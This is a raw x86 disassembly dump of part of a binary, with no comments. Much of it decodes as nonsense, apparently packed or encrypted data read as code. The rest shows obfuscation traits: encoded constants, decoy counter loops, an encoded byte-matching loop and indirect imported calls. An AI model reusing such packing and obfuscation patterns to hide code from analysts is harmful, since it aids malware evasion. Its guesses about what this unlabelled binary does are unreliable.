  41a896:	xor    ecx,edi
  41a898:	out    dx,eax
  41a899:	jno    0x41a8f6
  41a89b:	xor    DWORD PTR [edx+0x62257d0b],edx
  41a8a1:	imul   esp,DWORD PTR [edi+0x1d0d40b2],0x4b
  41a8a8:	xor    BYTE PTR [ebx+0x68a57c90],bh
  41a8ae:	dec    edi
  41a8af:	cmp    DWORD PTR [ebx],0xffffffd8
  41a8b2:	jp     0x41a8b7
  41a8b4:	xchg   ebx,eax
  41a8b5:	xchg   esi,eax
  41a8b6:	pop    es
  41a8b7:	xor    BYTE PTR [esi+ebp*2],dh
  41a8ba:	test   DWORD PTR [esp+ecx*1+0x218edda4],ecx
  41a8c1:	or     al,BYTE PTR [edx-0x1e326787]
  41a8c7:	and    eax,DWORD PTR [ecx+0x13041f3b]
  41a8cd:	and    al,0xb2
  41a8cf:	dec    esi
  41a8d0:	cmp    BYTE PTR [eax],al
  41a8d2:	bound  ebx,QWORD PTR [esp+edx*8]
  41a8d5:	jbe    0x41a8ec
  41a8d7:	mov    esp,0x7c6f40e0
  41a8dc:	out    0x47,eax
  41a8de:	mov    edi,eax
  41a8e0:	adc    DWORD PTR [ecx-0x3c],ebx
  41a8e3:	call   0x60f2:0x65bd9bce
  41a8ea:	retf   0x9462
  41a8ed:	ror    dh,1
  41a8ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8f0:	push   es
  41a8f1:	or     bl,BYTE PTR [esi+0x19]
  41a8f4:	out    0xe0,eax
  41a8f6:	inc    eax
  41a8f7:	ret    
  41a8f8:	arpl   WORD PTR [edx],bp
  41a8fa:	mov    edx,0x80b2916
  41a8ff:	popf   
  41a900:	mov    esp,0x4a7e544a
  41a905:	mov    esi,0xfbb7badc
  41a90a:	ins    BYTE PTR es:[edi],dx
  41a90b:	cmc    
  41a90c:	(bad)  
  41a90d:	sub    BYTE PTR [esi-0x407be08d],ch
  41a913:	mov    esi,0x224625e1
  41a918:	pop    edx
  41a919:	imul   ecx,DWORD PTR [ebx-0x48afaea9],0x8d07c651
  41a923:	sub    eax,0x729e0954
  41a928:	out    dx,eax
  41a929:	fild   WORD PTR [eax]
  41a92b:	es faddp st(1),st
  41a92e:	enter  0x67f6,0x89
  41a932:	sub    DWORD PTR [edx+0x38],ebp
  41a935:	lods   eax,DWORD PTR ds:[esi]
  41a936:	push   0xb1dcc206
  41a93b:	jnp    0x41a8c4
  41a93d:	push   0xfffffff3
  41a93f:	pop    eax
  41a940:	aad    0x52
  41a942:	ins    BYTE PTR es:[edi],dx
  41a943:	pushf  
  41a944:	jecxz  0x41a8fe
  41a946:	(bad)  
  41a947:	mov    edi,0xe3906f95
  41a94c:	mov    ds,ebp
  41a94e:	push   ecx
  41a94f:	cwde   
  41a950:	nop
  41a951:	jns    0x41a9c7
  41a953:	push   ss
  41a954:	xor    BYTE PTR [ecx],ah
  41a956:	sub    al,0xb5
  41a958:	push   cs
  41a959:	and    ah,BYTE PTR [ebx+0x9]
  41a95c:	stc    
  41a95d:	(bad)  
  41a95e:	mov    ah,BYTE PTR [ecx+0x19]
  41a961:	and    BYTE PTR [edx+0x2b],bl
  41a964:	or     BYTE PTR [esi+ecx*4-0x57],0x87
  41a969:	jg     0x41a93e
  41a96b:	lods   eax,DWORD PTR ds:[esi]
  41a96c:	mov    ch,cl
  41a96e:	jo     0x41a979
  41a970:	test   eax,0xa6fa7281
  41a975:	jb     0x41a982
  41a977:	fist   WORD PTR [ebx+0x3729a3f5]
  41a97d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a97e:	pop    eax
  41a97f:	and    al,0xa3
  41a981:	adc    DWORD PTR [edi-0x14],ebp
  41a984:	cmp    ah,BYTE PTR [edi+edx*2]
  41a987:	repz bound esi,QWORD PTR [eax+0x7f]
  41a98b:	xchg   ebx,eax
  41a98c:	cmp    ah,ch
  41a98e:	or     esp,esi
  41a990:	fidivr WORD PTR [edx]
  41a992:	pop    ss
  41a993:	inc    ebp
  41a994:	loope  0x41a96b
  41a996:	fnstsw WORD PTR [ebx+0x341ce5d3]
  41a99c:	xchg   edi,eax
  41a99d:	enter  0xe6b3,0x4b
  41a9a1:	scas   eax,DWORD PTR es:[edi]
  41a9a2:	test   ebx,edi
  41a9a4:	mov    dl,0xef
  41a9a6:	xchg   ebp,eax
  41a9a7:	ins    DWORD PTR es:[edi],dx
  41a9a8:	lock mov esp,DWORD PTR [esi+0x69468c5b]
  41a9af:	xchg   esi,eax
  41a9b0:	in     eax,0x92
  41a9b2:	push   esp
  41a9b3:	sub    eax,0x90cc7fa3
  41a9b8:	and    ebp,DWORD PTR [edi]
  41a9ba:	mov    ds:0x255b4b3d,eax
  41a9bf:	and    edi,edx
  41a9c1:	test   BYTE PTR ds:0xe3637800,al
  41a9c7:	aaa    
  41a9c8:	and    BYTE PTR [ebx-0x40],dh
  41a9cb:	jo     0x41a96d
  41a9cd:	das    
  41a9ce:	jmp    0x41a975
  41a9d0:	rcl    BYTE PTR [eax-0x66623a29],cl
  41a9d6:	jno    0x41a9d0
  41a9d8:	mov    ebx,0x463d9500
  41a9dd:	sub    ebx,DWORD PTR [edx+0x713271ac]
  41a9e3:	xlat   BYTE PTR ds:[ebx]
  41a9e4:	outs   dx,BYTE PTR ds:[esi]
  41a9e5:	ret    0xe618
  41a9e8:	sub    dh,BYTE PTR [edx-0x1ce162ae]
  41a9ee:	xchg   esi,eax
  41a9ef:	add    eax,0x4f530751
  41a9f4:	outs   dx,DWORD PTR ds:[esi]
  41a9f5:	sbb    eax,0x7c7812e6
  41a9fa:	ret    0xa9e3
  41a9fd:	or     DWORD PTR [esi+edi*2+0x26],esi
  41aa01:	mov    edx,0x77ec5fd
  41aa06:	sbb    edx,ecx
  41aa08:	push   esp
  41aa09:	(bad)  
  41aa0a:	fmul   DWORD PTR [eax]
  41aa0c:	cmp    dl,al
  41aa0e:	and    BYTE PTR [ebp+0x5f8552a8],0x78
  41aa15:	adc    eax,0x84334398
  41aa1a:	adc    ch,ch
  41aa1c:	mov    ds:0x4ac55158,eax
  41aa21:	repnz sub BYTE PTR [edi+ebx*1-0x7c060029],bh
  41aa29:	dec    ebp
  41aa2a:	inc    eax
  41aa2b:	test   eax,0x4ebe550c
  41aa30:	and    BYTE PTR [edx-0x5bb23998],dh
  41aa36:	mov    BYTE PTR [ebx-0x116fb774],ch
  41aa3c:	mov    al,0x8f
  41aa3e:	dec    esi
  41aa3f:	cmp    ebp,edi
  41aa41:	mov    edi,0x5c2dca85
  41aa46:	jns    0x41aa65
  41aa48:	mov    edx,0x51339a50
  41aa4d:	(bad)  
  41aa4e:	das    
  41aa4f:	sub    al,dl
  41aa51:	stos   BYTE PTR es:[edi],al
  41aa52:	pushf  
  41aa53:	xlat   BYTE PTR fs:[ebx]
  41aa55:	loope  0x41aa67
  41aa57:	fdiv   st(5),st
  41aa59:	mov    al,ds:0x2f85a0db
  41aa5e:	jmp    0x41aa55
  41aa60:	imul   DWORD PTR [esi-0x70f91914]
  41aa66:	mov    ?,WORD PTR [ecx+ebx*2+0x13]
  41aa6a:	dec    edi
  41aa6b:	mov    DWORD PTR [ecx+0x4284713],ebp
  41aa71:	jmp    0xd7ad33cd
  41aa76:	sahf   
  41aa77:	scas   al,BYTE PTR es:[edi]
  41aa78:	or     esp,DWORD PTR [ebx+esi*8+0x5b]
  41aa7c:	enter  0xa23d,0xa8
  41aa80:	mov    ebx,0x9e86fb4f
  41aa85:	mov    WORD PTR [ebx+0x3444f280],cs
  41aa8b:	mov    ebx,0x57a4462c
  41aa90:	mov    dl,0xf7
  41aa92:	mov    fs,WORD PTR [ecx+ecx*1-0x42]
  41aa96:	add    eax,0xabacd55a
  41aa9b:	push   edx
  41aa9c:	inc    esp
  41aa9d:	or     eax,0x7c28fbe3
  41aaa2:	adc    esp,ebp
  41aaa4:	jne    0x41aa4b
  41aaa6:	int3   
  41aaa7:	adc    al,0xd0
  41aaa9:	jbe    0x41ab1e
  41aaab:	add    eax,0xe480337f
  41aab0:	stc    
  41aab1:	test   DWORD PTR [ebx+eiz*8],ebp
  41aab4:	mov    bh,0xe9
  41aab6:	pop    ecx
  41aab7:	imul   edx,DWORD PTR [edi-0x13ec8246],0xffffffd7
  41aabe:	adc    eax,0x46cdf16f
  41aac3:	jmp    0xca9c60d6
  41aac8:	push   ds
  41aac9:	sub    ah,0x96
  41aacc:	mov    ch,0x30
  41aace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aacf:	outs   dx,BYTE PTR ds:[esi]
  41aad0:	or     DWORD PTR [edi],eax
  41aad2:	dec    esi
  41aad3:	shl    BYTE PTR [edx+0x21],1
  41aad6:	jns    0x41aa70
  41aad8:	mov    DWORD PTR [eax+0x151f282f],0xd63e69c0
  41aae2:	cmc    
  41aae3:	pusha  
  41aae4:	cmp    al,0x9d
  41aae6:	shr    DWORD PTR [ebx-0x1c3dddb5],cl
  41aaec:	mov    bl,0xd8
  41aaee:	pop    eax
  41aaef:	je     0x41aabe
  41aaf1:	xchg   ecx,eax
  41aaf2:	mov    ebp,0xce511a5b
  41aaf7:	pop    esi
  41aaf8:	mov    edi,0xf7c8ff01
  41aafd:	mov    ds:0xea5df7ec,al
  41ab02:	sub    DWORD PTR [ebx],esp
  41ab04:	call   0xa0d4:0xf75b781e
  41ab0b:	cmp    ah,BYTE PTR [ebx+0x1d]
  41ab0e:	push   ebx
  41ab0f:	sti    
  41ab10:	cmp    ah,ah
  41ab12:	or     DWORD PTR [edi],ecx
  41ab14:	mov    ebx,0xe19e9702
  41ab19:	fs in  al,0x77
  41ab1c:	fs jle 0x41ab15
  41ab1f:	or     eax,0xb17ea0e3
  41ab24:	inc    edx
  41ab25:	rol    eax,cl
  41ab27:	aas    
  41ab28:	cld    
  41ab29:	pop    ds
  41ab2a:	mov    DWORD PTR [esi],edi
  41ab2c:	cli    
  41ab2d:	mov    dl,0xfa
  41ab2f:	iret   
  41ab30:	test   DWORD PTR [edi],esi
  41ab32:	inc    edx
  41ab33:	mov    al,ds:0x10231e8e
  41ab38:	sub    al,0xf8
  41ab3a:	add    al,0x91
  41ab3c:	add    cl,BYTE PTR [eax-0x22dba476]
  41ab42:	and    dh,al
  41ab44:	cmp    al,BYTE PTR [eax+0x0]
  41ab47:	sub    esi,DWORD PTR [esi-0x38]
  41ab4a:	jne    0x41ab1e
  41ab4c:	and    BYTE PTR [eax+0x55],cl
  41ab4f:	outs   dx,BYTE PTR ds:[esi]
  41ab50:	js     0x41abb1
  41ab52:	lahf   
  41ab53:	mov    ds:0x45acb5e9,eax
  41ab58:	sub    al,0xef
  41ab5a:	arpl   WORD PTR [eax+0x797cf279],cx
  41ab60:	dec    ebx
  41ab61:	aam    0x3e
  41ab63:	cmp    eax,0xa950b0e
  41ab68:	cmc    
  41ab69:	push   es
  41ab6a:	and    al,0x43
  41ab6c:	(bad)  
  41ab6d:	rol    DWORD PTR [edx],cl
  41ab6f:	push   cs
  41ab70:	and    al,0xa6
  41ab72:	fnstcw WORD PTR [esi-0x33]
  41ab75:	test   eax,0x94e615c6
  41ab7a:	cmp    al,dh
  41ab7c:	das    
  41ab7d:	add    ecx,DWORD PTR [edx]
  41ab7f:	aaa    
  41ab80:	pop    eax
  41ab81:	ds push eax
  41ab83:	mov    eax,0x332bf333
  41ab88:	sbb    dl,BYTE PTR [eax-0x52]
  41ab8b:	std    
  41ab8c:	repnz dec edx
  41ab8e:	push   ds
  41ab8f:	fcomp  DWORD PTR [esi+edx*4-0x47]
  41ab93:	stc    
  41ab94:	xlat   BYTE PTR ds:[ebx]
  41ab95:	sbb    dh,BYTE PTR [esi]
  41ab97:	pop    esp
  41ab98:	or     edx,DWORD PTR [ebx]
  41ab9a:	lldt   WORD PTR [ebp+eiz*2+0x40fad8aa]
  41aba2:	adc    DWORD PTR [ecx],esi
  41aba4:	loop   0x41ab70
  41aba6:	push   edi
  41aba7:	nop
  41aba8:	iret   
  41aba9:	std    
  41abaa:	push   ecx
  41abab:	sub    al,0x37
  41abad:	cmp    ch,0xa9
  41abb0:	push   edi
  41abb1:	mov    ecx,cs
  41abb3:	daa    
  41abb4:	mov    esi,DWORD PTR ds:0x6bab1382
  41abba:	sar    BYTE PTR fs:[eax],1
  41abbd:	pushf  
  41abbe:	stos   DWORD PTR es:[edi],eax
  41abbf:	into   
  41abc0:	add    BYTE PTR [esi+0x72],dl
  41abc3:	push   edi
  41abc4:	fucomi st,st(2)
  41abc6:	cli    
  41abc7:	outs   dx,BYTE PTR ds:[esi]
  41abc8:	xchg   edx,eax
  41abc9:	les    esi,FWORD PTR [eax+0x6]
  41abcc:	popa   
  41abcd:	mov    ds:0xaf41ce45,eax
  41abd2:	ss cwde 
  41abd4:	mov    edx,0xd3d18162
  41abd9:	cmp    BYTE PTR [ebp-0x7e],bl
  41abdc:	cld    
  41abdd:	enter  0x3814,0x9d
  41abe1:	mov    cl,0x66
  41abe3:	adc    al,BYTE PTR [edx-0x37]
  41abe6:	cmp    DWORD PTR [edi-0x5a],esi
  41abe9:	xchg   edx,eax
  41abea:	pop    ss
  41abeb:	xchg   edx,eax
  41abec:	mov    gs,WORD PTR [edi-0x73]
  41abef:	mov    eax,ds:0xb9f5605
  41abf4:	loope  0x41abb5
  41abf6:	aaa    
  41abf7:	xor    esi,edx
  41abf9:	xor    bl,BYTE PTR [esi]
  41abfb:	test   eax,0xf067d440
  41ac00:	lods   al,BYTE PTR ds:[esi]
  41ac01:	stos   DWORD PTR es:[edi],eax
  41ac02:	dec    ebp
  41ac03:	mov    esp,0xa62aeb38
  41ac08:	sbb    DWORD PTR [ecx+0xeba5f87],edx
  41ac0e:	jge    0x41ac82
  41ac10:	push   ss
  41ac11:	and    esp,DWORD PTR [ecx+edi*4]
  41ac14:	les    ecx,FWORD PTR [edi+0x65]
  41ac17:	pop    es
  41ac18:	cmp    ebp,0xfffffff5
  41ac1b:	inc    esi
  41ac1c:	dec    edi
  41ac1d:	addr16 in eax,0xd3
  41ac20:	cs gs and al,0xa3
  41ac24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac25:	and    eax,0x6e5d7d1a
  41ac2a:	xchg   edx,eax
  41ac2b:	rcl    DWORD PTR [eax],0x14
  41ac2e:	(bad)  
  41ac2f:	cld    
  41ac30:	sti    
  41ac31:	push   esp
  41ac32:	xchg   esi,eax
  41ac33:	adc    al,0xde
  41ac35:	pop    esi
  41ac36:	xchg   ebx,eax
  41ac37:	lea    ebx,ds:0xf5d6f3f2
  41ac3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac3e:	xchg   ebp,eax
  41ac3f:	cmp    eax,0x1fbf28c0
  41ac44:	adc    DWORD PTR [ebp+0x69],eax
  41ac47:	sbb    DWORD PTR [edx-0x65],edx
  41ac4a:	jns    0x41ac44
  41ac4c:	mov    eax,0xc2fb8230
  41ac51:	icebp  
  41ac52:	jp     0x41abe3
  41ac54:	imul   bh
  41ac56:	xchg   edi,eax
  41ac57:	imul   edx,DWORD PTR [edx],0xffffffed
  41ac5a:	leave  
  41ac5b:	iret   
  41ac5c:	aad    0xfb
  41ac5e:	xchg   edx,eax
  41ac5f:	scas   al,BYTE PTR es:[edi]
  41ac60:	popa   
  41ac61:	adc    eax,0x74687c6d
  41ac66:	pop    eax
  41ac67:	mov    ch,0xc2
  41ac69:	or     al,0x52
  41ac6b:	(bad)  
  41ac6c:	mov    ebp,0xab76444a
  41ac71:	je     0x41ace7
  41ac73:	pop    ds
  41ac74:	adc    eax,0x7ddf6806
  41ac79:	inc    edx
  41ac7a:	push   ss
  41ac7b:	jle    0x41acfa
  41ac7d:	add    edi,DWORD PTR [ecx+0x43c10475]
  41ac83:	call   0x6d5:0xa90b14c8
  41ac8a:	cmp    DWORD PTR [edi+ebx*4+0x1f9671df],0x5a
  41ac92:	sub    al,0x4f
  41ac94:	daa    
  41ac95:	mov    WORD PTR [edi-0x6c72345a],es
  41ac9b:	cs ja  0x41ad0e
  41ac9e:	je     0x41ad12
  41aca0:	div    dl
  41aca2:	mov    ds:0x766406c7,al
  41aca7:	scas   eax,DWORD PTR es:[edi]
  41aca8:	outs   dx,BYTE PTR ds:[esi]
  41aca9:	xor    edi,edi
  41acab:	mov    DWORD PTR [ebp-0x17],edx
  41acae:	into   
  41acaf:	adc    ebp,esi
  41acb1:	jnp    0x41ad14
  41acb3:	ret    
  41acb4:	jb     0x41ac91
  41acb6:	inc    edx
  41acb7:	dec    ebx
  41acb8:	jl     0x41acfa
  41acba:	je     0x41acb6
  41acbc:	adc    al,0x26
  41acbe:	and    al,bh
  41acc0:	add    al,BYTE PTR [esi]
  41acc2:	les    edi,FWORD PTR [ecx-0x61]
  41acc5:	mov    bl,0x18
  41acc7:	(bad)  
  41acc8:	(bad)  [ecx+esi*1-0x5f]
  41accc:	dec    edx
  41accd:	fs loopne 0x41aca9
  41acd0:	or     al,0x53
  41acd2:	jp     0x41acf6
  41acd4:	popa   
  41acd5:	push   0x16009a9b
  41acda:	int3   
  41acdb:	ror    DWORD PTR [ecx+0x3836b8c1],1
  41ace1:	imul   BYTE PTR [eax+0x1036be2c]
  41ace7:	inc    ebx
  41ace8:	rcr    esp,cl
  41acea:	ins    DWORD PTR es:[edi],dx
  41aceb:	test   eax,0x85303970
  41acf0:	jb     0x41ad22
  41acf2:	adc    bh,ch
  41acf4:	dec    ebp
  41acf5:	outs   dx,BYTE PTR ds:[esi]
  41acf6:	(bad)  
  41acf7:	pusha  
  41acf8:	aaa    
  41acf9:	les    eax,FWORD PTR [ecx-0x47ea29f1]
  41acff:	aaa    
  41ad00:	shl    DWORD PTR [ebp-0x17797040],cl
  41ad06:	stc    
  41ad07:	les    ecx,FWORD PTR [ebx+0x65]
  41ad0a:	push   es
  41ad0b:	and    DWORD PTR [esp+ebp*2-0x66],0x93d6670f
  41ad13:	test   al,0x73
  41ad15:	xlat   BYTE PTR ds:[ebx]
  41ad16:	xchg   ebx,eax
  41ad17:	push   edx
  41ad18:	(bad)  
  41ad19:	ficomp WORD PTR [edx-0x5a]
  41ad1c:	sbb    ch,al
  41ad1e:	lds    esi,FWORD PTR [ecx]
  41ad20:	js     0x41ad2e
  41ad22:	arpl   WORD PTR [ecx+0x2f],si
  41ad25:	jae    0x41acba
  41ad27:	sub    DWORD PTR [ebx],ebx
  41ad29:	push   es
  41ad2a:	adc    al,0xaf
  41ad2c:	ss pop esi
  41ad2e:	pop    ebp
  41ad2f:	mov    BYTE PTR [ebx],bl
  41ad31:	rcl    dh,1
  41ad33:	popa   
  41ad34:	jecxz  0x41acf5
  41ad36:	gs lahf 
  41ad38:	mov    ?,edi
  41ad3a:	xlat   BYTE PTR ds:[ebx]
  41ad3b:	js     0x41aced
  41ad3d:	test   bh,cl
  41ad3f:	or     eax,0x4c792fd0
  41ad44:	std    
  41ad45:	cmp    BYTE PTR [edx],dl
  41ad47:	sub    eax,ebp
  41ad49:	jae    0x41adb5
  41ad4b:	pop    edx
  41ad4c:	mov    ds:0x112c1fdb,al
  41ad51:	pop    ebx
  41ad52:	xor    eax,0x1d3916b7
  41ad57:	gs stos DWORD PTR es:[edi],eax
  41ad59:	cmc    
  41ad5a:	jp     0x41ad94
  41ad5c:	push   0x20842051
  41ad61:	lahf   
  41ad62:	xchg   esi,eax
  41ad63:	leave  
  41ad64:	int3   
  41ad65:	enter  0x99d7,0xa9
  41ad69:	xor    cl,al
  41ad6b:	jmp    0x6937:0x32091d9a
  41ad72:	and    al,0x2e
  41ad74:	xlat   BYTE PTR ds:[ebx]
  41ad75:	jmp    0xa19a:0x5a5b2bc8
  41ad7c:	imul   edx,DWORD PTR [edi+0xf],0x5
  41ad80:	push   ecx
  41ad81:	push   ecx
  41ad82:	(bad)  
  41ad83:	test   al,0x4
  41ad85:	jne    0x41ad8d
  41ad87:	dec    ebx
  41ad88:	jmp    0x41ad58
  41ad8a:	int    0xc3
  41ad8c:	ret    0xcdd1
  41ad8f:	div    BYTE PTR [edx+0x58]
  41ad92:	add    esp,DWORD PTR [ebx-0x1c6e65dc]
  41ad98:	pop    ecx
  41ad99:	jle    0x41ad96
  41ad9b:	hlt    
  41ad9c:	ficom  WORD PTR [ebx+ebp*1-0x67]
  41ada0:	jmp    0xd955:0xb5f0eef2
  41ada7:	aas    
  41ada8:	int    0x7b
  41adaa:	enter  0x706c,0xe3
  41adae:	sub    BYTE PTR [edx-0x2fe1b969],ah
  41adb4:	jae    0x41ad85
  41adb6:	out    0xeb,eax
  41adb8:	cmc    
  41adb9:	or     al,0xde
  41adbb:	jmp    0x41ad94
  41adbd:	adc    al,0x69
  41adbf:	lea    ebx,[edx+eiz*2+0x4f]
  41adc3:	stos   BYTE PTR es:[edi],al
  41adc4:	sub    esp,0x27a9503b
  41adca:	data16 stos BYTE PTR es:[edi],al
  41adcc:	adc    esp,DWORD PTR [ecx-0xa]
  41adcf:	in     al,0x75
  41add1:	inc    edx
  41add2:	les    edx,FWORD PTR [edx+0x3]
  41add5:	(bad)  
  41add6:	or     DWORD PTR [ebx],esp
  41add8:	xchg   ecx,eax
  41add9:	mov    ds,WORD PTR [ebp+0x4564629c]
  41addf:	add    eax,ecx
  41ade1:	les    edi,FWORD PTR [ebp-0x27]
  41ade4:	lahf   
  41ade5:	bnd jns 0x41ad6f
  41ade8:	and    BYTE PTR [ebx+0x4589f718],dl
  41adee:	clc    
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c56
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421ad6
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421cde
  41afcc:	mov    ecx,DWORD PTR ds:0x421a4e
  41afd2:	mov    ecx,DWORD PTR [ecx]
  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x423892
  41b017:	push   0x423812
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
